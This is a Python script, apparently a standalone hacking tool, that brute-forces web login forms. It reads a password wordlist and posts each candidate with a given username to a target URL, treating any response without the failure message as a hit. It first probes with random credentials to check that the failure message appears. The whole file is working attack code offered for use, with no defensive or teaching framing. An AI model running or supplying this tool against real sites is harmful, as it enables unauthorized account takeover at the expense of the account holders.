import requests
import sys
import random
import string

USAGE = "USAGE:\npython3 %s [url] [<username>=$USER&<password>=$PASS&other..] [U=<USERNAME>] [P=<Password File>] [Error Message]\n\n" 
CHECKED = 0

def checkValid(args):
    if (args[2].find("$USER") < 0 or args[2].find("$PASS") < 0):
        return -1
    if (args[3][:2] != "U=" or args[4][:2] != "P="):
        return -1
    return 0

def printHeader(args):
    print("===============================================================")
    print("[*] Brute Force Login Credentials")
    print("[*] By 0ThM@n")
    print("===============================================================\n")
    print("[+] URL:             " + args[1])
    print("[+] Request Data:    " + args[2])
    print("[+] UserName:        " + args[3].split("=")[1])
    print("[+] Passwords Files: " + args[4].split("=")[1])
    print("[+] Error Message:   " + args[5])
    print("\n")

def readPassFile(path):
    try:
        f = open(path,"r",encoding="utf-8")
        passwords = f.readlines()
        f.close()
    except:
        return -1
    return passwords

def getrand():
    letters = string.ascii_letters
    rand = "".join([random.choice(letters) for i in range(13)])
    return rand

def checkMsg(url, data, msg):
    for i in range(5):
        try:
            randUser = getrand()
            randPass = getrand()
            data = data.replace("$USER",randUser).replace("$PASS",randPass)
            r = requests.post(url, timeout=7, data=data, headers={"Content-Type":"application/x-www-form-urlencoded"})
            if (r.text.find(msg) == -1):
                return 3
        except:
            return 2
    return 0

def sendReq(url, data, username, password, msg):
    global CHECKED
    if (CHECKED == 0):
        status = checkMsg(url, data, msg)
        if (status > 0):
            return status
        CHECKED = 1
    try:
        data = data.replace("$USER",username).replace("$PASS",password)
        r = requests.post(url, timeout=7, data=data, headers={"Content-Type":"application/x-www-form-urlencoded"})
        if (r.text.find(msg) == -1):
            return 0
    except:
        return 4
    return 1

if (__name__ == "__main__"):
    if(len(sys.argv) < 6 or checkValid(sys.argv) < 0):
        print(USAGE.replace("%s",sys.argv[0]))
    else:
        printHeader(sys.argv)
        passwords = readPassFile(sys.argv[4].split("=")[1])
        if (passwords == -1):
            print("Error While Reading The Passwords File")
            exit()
        for password in passwords:
            password = password.replace("\n","")
            status = sendReq(sys.argv[1], sys.argv[2], sys.argv[3].split("=")[1], password, sys.argv[5])
            if (status == 0):
                print("Password Found: " + password)
                break
            if (status == 1):
                print("Password Invalid: " + password)
            if (status == 2):
                print("Error, Check the given Url !!")
                break
            if (status == 3):
                print("Error Message Not Found, Check the given message")
            if (status == 4):
                print("Error While Trying The Password: " + password)
        
